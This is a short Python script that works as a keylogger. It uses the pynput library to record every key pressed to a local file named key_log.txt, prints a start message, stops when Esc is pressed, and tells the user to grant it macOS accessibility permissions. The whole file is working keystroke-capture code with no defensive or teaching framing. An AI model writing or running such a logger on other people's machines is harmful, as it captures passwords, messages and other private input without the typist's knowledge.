from pynput import keyboard
import os
import sys
import termios

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nKey logger stopped.")

        termios.tcflush(sys.stdin, termios.TCIFLUSH)
        
        os._exit(0)

print("Key logger started. Press 'Esc' to stop.")
print("Ensure the script is added to accessibility clients for full functionality.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
